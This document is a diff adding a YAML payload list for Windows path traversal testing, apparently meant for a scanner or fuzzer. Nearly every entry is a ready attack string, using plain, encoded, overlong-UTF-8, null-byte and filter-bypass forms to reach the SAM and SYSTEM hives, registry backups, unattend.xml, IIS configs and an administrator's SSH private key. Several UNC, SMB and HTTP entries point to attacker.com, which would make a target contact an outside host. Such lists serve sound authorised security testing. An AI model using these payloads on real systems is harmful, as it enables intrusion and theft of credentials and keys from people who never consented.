@@ -1,0 +1,437 @@
+metadata:
+  type: traversal/windows
+  version: "1.0"
+  description: "Windows path traversal payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "\\[boot loader\\]"
+  - "\\[operating systems\\]"
+  - "Volume Serial Number"
+
+payloads:
+  basic:
+    - value: "..\\..\\..\\windows\\system32\\config\\sam"
+      description: "Basic Windows SAM traversal"
+      severity: critical
+      tags: [basic, sam]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\system"
+      description: "Windows system config"
+      severity: critical
+      tags: [basic, system]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      description: "Windows hosts file"
+      severity: high
+      tags: [basic, hosts]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hostname"
+      description: "Windows hostname"
+      severity: high
+      tags: [basic, hostname]
+
+    - value: "..\\..\\..\\windows\\win.ini"
+      description: "Windows win.ini"
+      severity: high
+      tags: [basic, win_ini]
+
+    - value: "..\\..\\..\\windows\\boot.ini"
+      description: "Windows boot.ini"
+      severity: high
+      tags: [basic, boot_ini]
+
+    - value: "..\\..\\..\\boot.ini"
+      description: "Boot.ini root"
+      severity: high
+      tags: [basic, boot_ini]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam"
+      description: "SAM file"
+      severity: critical
+      tags: [basic, sam]
+
+    - value: "..\\..\\..\\windows\\repair\\sam"
+      description: "Backup SAM"
+      severity: critical
+      tags: [basic, sam]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\system"
+      description: "System config"
+      severity: critical
+      tags: [basic, system]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\security"
+      description: "Security config"
+      severity: critical
+      tags: [basic, security]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\software"
+      description: "Software config"
+      severity: critical
+      tags: [basic, software]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\default"
+      description: "Default config"
+      severity: high
+      tags: [basic, default]
+
+    - value: "..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config"
+      description: "IIS config"
+      severity: critical
+      tags: [basic, iis]
+
+    - value: "..\\..\\..\\inetpub\\wwwroot\\web.config"
+      description: "IIS web.config"
+      severity: critical
+      tags: [basic, iis]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+      description: "Networks file"
+      severity: medium
+      tags: [basic, networks]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+      description: "Protocol file"
+      severity: medium
+      tags: [basic, protocol]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+      description: "Services file"
+      severity: medium
+      tags: [basic, services]
+
+  encoded:
+    - value: "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
+      description: "URL encoded backslash"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam"
+      description: "URL encoded uppercase"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam"
+      description: "Double URL encoded backslash"
+      severity: critical
+      tags: [encoded, double_url]
+
+    - value: "..%2f..%2f..%2fwindows%2fsystem32%2fconfig%2fsam"
+      description: "URL encoded forward slash"
+      severity: critical
+      tags: [encoded, url]
+
+    - value: "..%c0%af..%c0%af..%c0%afwindows%c0%afsystem32%c0%afconfig%c0%afsam"
+      description: "UTF-8 overlong slash"
+      severity: critical
+      tags: [encoded, utf8_overlong]
+
+    - value: "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cconfig%c1%9csam"
+      description: "UTF-8 overlong backslash"
+      severity: critical
+      tags: [encoded, utf8_overlong]
+
+    - value: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fwindows%ef%bc%8fsystem32%ef%bc%8fconfig%ef%bc%8fsam"
+      description: "Fullwidth slash"
+      severity: critical
+      tags: [encoded, fullwidth]
+
+    - value: "%u002e%u002e%u005c%u002e%u002e%u005c%u002e%u002e%u005cwindows%u005csystem32%u005cconfig%u005csam"
+      description: "Unicode %u encoding"
+      severity: critical
+      tags: [encoded, unicode]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam%00"
+      description: "Null byte termination"
+      severity: critical
+      tags: [encoded, null_byte]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam%00.jpg"
+      description: "Null byte with extension"
+      severity: critical
+      tags: [encoded, null_byte]
+
+  unc_paths:
+    - value: "\\\\server\\share"
+      description: "UNC path basic"
+      severity: high
+      tags: [unc]
+
+    - value: "\\\\127.0.0.1\\c$"
+      description: "UNC localhost C$"
+      severity: critical
+      tags: [unc, localhost]
+
+    - value: "\\\\127.0.0.1\\admin$"
+      description: "UNC localhost admin$"
+      severity: critical
+      tags: [unc, localhost]
+
+    - value: "\\\\127.0.0.1\\ipc$"
+      description: "UNC localhost ipc$"
+      severity: critical
+      tags: [unc, localhost]
+
+    - value: "\\\\attacker.com\\share"
+      description: "UNC external server"
+      severity: critical
+      tags: [unc, external]
+
+    - value: "\\\\attacker.com\\share\\file.txt"
+      description: "UNC external file"
+      severity: critical
+      tags: [unc, external]
+
+    - value: "\\\\10.0.0.1\\share"
+      description: "UNC internal network"
+      severity: critical
+      tags: [unc, internal]
+
+    - value: "\\\\192.168.1.1\\share"
+      description: "UNC router"
+      severity: critical
+      tags: [unc, internal]
+
+    - value: "\\\\\\\\.\\C:\\windows\\win.ini"
+      description: "UNC device path"
+      severity: high
+      tags: [unc, device]
+
+    - value: "\\\\?\\C:\\windows\\win.ini"
+      description: "UNC long path prefix"
+      severity: high
+      tags: [unc, long_path]
+
+    - value: "\\\\.\\C:\\windows\\win.ini"
+      description: "UNC dot device path"
+      severity: high
+      tags: [unc, device]
+
+    - value: "//server/share"
+      description: "Forward slash UNC"
+      severity: high
+      tags: [unc, forward_slash]
+
+    - value: "//attacker.com/share"
+      description: "Forward slash UNC external"
+      severity: critical
+      tags: [unc, external]
+
+  filter_bypass:
+    - value: "..\\..\\..\\windows\\system32\\config\\sam"
+      description: "Standard backslash"
+      severity: critical
+      tags: [filter_bypass]
+
+    - value: "..\\..\\..\\windows/system32/config/sam"
+      description: "Mixed slashes"
+      severity: critical
+      tags: [filter_bypass, mixed_slash]
+
+    - value: "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam"
+      description: "Double backslash bypass"
+      severity: critical
+      tags: [filter_bypass, double_backslash]
+
+    - value: "..;/..;/..;/windows/system32/config/sam"
+      description: "Semicolon bypass"
+      severity: critical
+      tags: [filter_bypass, semicolon]
+
+    - value: "/../../../windows/system32/config/sam"
+      description: "Leading slash forward"
+      severity: critical
+      tags: [filter_bypass, leading_slash]
+
+    - value: "\\..\\..\\..\\windows\\system32\\config\\sam"
+      description: "Leading backslash"
+      severity: critical
+      tags: [filter_bypass, leading_slash]
+
+    - value: "..\\..\\..\\WINDOWS\\SYSTEM32\\CONFIG\\SAM"
+      description: "Uppercase bypass"
+      severity: critical
+      tags: [filter_bypass, case]
+
+    - value: "..\\..\\..\\WiNdOwS\\sYsTeM32\\cOnFiG\\sAm"
+      description: "Mixed case bypass"
+      severity: critical
+      tags: [filter_bypass, case]
+
+    - value: "..%00\\..%00\\..%00\\windows\\system32\\config\\sam"
+      description: "Null byte in path"
+      severity: critical
+      tags: [filter_bypass, null_byte]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam#"
+      description: "Fragment bypass"
+      severity: high
+      tags: [filter_bypass, fragment]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam?"
+      description: "Query bypass"
+      severity: high
+      tags: [filter_bypass, query]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam%20"
+      description: "Space bypass"
+      severity: high
+      tags: [filter_bypass, space]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam%09"
+      description: "Tab bypass"
+      severity: high
+      tags: [filter_bypass, tab]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam%0d%0a"
+      description: "CRLF bypass"
+      severity: high
+      tags: [filter_bypass, crlf]
+
+  specific_files:
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+      description: "Hosts file"
+      severity: high
+      tags: [file, hosts]
+
+    - value: "..\\..\\..\\windows\\win.ini"
+      description: "win.ini"
+      severity: high
+      tags: [file, win_ini]
+
+    - value: "..\\..\\..\\windows\\boot.ini"
+      description: "boot.ini"
+      severity: high
+      tags: [file, boot_ini]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\sam"
+      description: "SAM file"
+      severity: critical
+      tags: [file, sam]
+
+    - value: "..\\..\\..\\windows\\repair\\sam"
+      description: "Backup SAM"
+      severity: critical
+      tags: [file, sam]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\system"
+      description: "System file"
+      severity: critical
+      tags: [file, system]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\security"
+      description: "Security file"
+      severity: critical
+      tags: [file, security]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\software"
+      description: "Software file"
+      severity: critical
+      tags: [file, software]
+
+    - value: "..\\..\\..\\inetpub\\wwwroot\\web.config"
+      description: "IIS web.config"
+      severity: critical
+      tags: [file, iis]
+
+    - value: "..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config"
+      description: "IIS applicationHost"
+      severity: critical
+      tags: [file, iis]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+      description: "Networks file"
+      severity: medium
+      tags: [file, networks]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\protocol"
+      description: "Protocol file"
+      severity: medium
+      tags: [file, protocol]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
+      description: "Services file"
+      severity: medium
+      tags: [file, services]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\lmhosts"
+      description: "LM hosts file"
+      severity: medium
+      tags: [file, lmhosts]
+
+    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
+      description: "Networks"
+      severity: medium
+      tags: [file, networks]
+
+    - value: "..\\..\\..\\windows\\panther\\unattend.xml"
+      description: "Unattended install"
+      severity: critical
+      tags: [file, unattend]
+
+    - value: "..\\..\\..\\windows\\panther\\unattend\\unattend.xml"
+      description: "Unattended install alt"
+      severity: critical
+      tags: [file, unattend]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\RegBack\\sam"
+      description: "Registry backup SAM"
+      severity: critical
+      tags: [file, regback]
+
+    - value: "..\\..\\..\\windows\\system32\\config\\RegBack\\system"
+      description: "Registry backup system"
+      severity: critical
+      tags: [file, regback]
+
+    - value: "..\\..\\..\\users\\administrator\\desktop\\flag.txt"
+      description: "Admin desktop"
+      severity: high
+      tags: [file, flag]
+
+    - value: "..\\..\\..\\users\\administrator\\.ssh\\id_rsa"
+      description: "Admin SSH key"
+      severity: critical
+      tags: [file, ssh]
+
+  wrapper_based:
+    - value: "file:///c:/windows/system32/drivers/etc/hosts"
+      description: "File protocol hosts"
+      severity: high
+      tags: [wrapper, file]
+
+    - value: "file:///c:/windows/win.ini"
+      description: "File protocol win.ini"
+      severity: high
+      tags: [wrapper, file]
+
+    - value: "file:///c:/windows/system32/config/sam"
+      description: "File protocol SAM"
+      severity: critical
+      tags: [wrapper, file]
+
+    - value: "file:///c:/boot.ini"
+      description: "File protocol boot.ini"
+      severity: high
+      tags: [wrapper, file]
+
+    - value: "\\\\attacker.com\\share"
+      description: "UNC external"
+      severity: critical
+      tags: [wrapper, unc]
+
+    - value: "//attacker.com/share"
+      description: "Forward slash UNC"
+      severity: critical
+      tags: [wrapper, unc]
+
+    - value: "smb://attacker.com/share"
+      description: "SMB protocol"
+      severity: critical
+      tags: [wrapper, smb]
+
+    - value: "http://attacker.com/"
+      description: "HTTP redirect"
+      severity: high
+      tags: [wrapper, http]
